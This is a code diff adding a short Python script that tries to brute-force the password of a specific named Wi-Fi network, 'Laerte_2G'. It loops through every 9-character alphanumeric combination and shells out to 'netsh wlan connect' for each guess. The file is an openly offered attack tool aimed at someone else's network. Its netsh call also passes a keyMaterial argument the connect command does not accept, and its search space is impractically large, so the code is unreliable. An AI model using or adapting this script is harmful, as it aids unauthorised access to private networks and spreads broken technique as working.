@@ -1,0 +1,29 @@
+
+#That's the way the ancient Aztecs did it.
+#Esse é o jeito que os antigos astecas faziam.
+
+import itertools
+import time
+import subprocess
+
+# Define the character set to use in the password
+charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+# Define the length of the password to brute force
+password_length = 9
+
+# Generate all possible combinations of the character set up to the password length
+passwords = itertools.product(charset, repeat=password_length)
+
+# Loop through each password combination and try to connect to the network
+for password in passwords:
+    password_str = ''.join(password)
+    print(f'Trying password: {password_str}')
+    try:
+        # Use subprocess to call the operating system's command line to attempt to connect to the network with the current password
+        subprocess.check_output(f'netsh wlan connect name="Laerte_2G" ssid="Laerte_2G" keyMaterial="{password_str}"', shell=True)
+        print(f'Successful connection with password: {password_str}')
+        break
+    except subprocess.CalledProcessError:
+        # If the connection attempt fails, wait for a few seconds before trying the next password
+        time.sleep(1)
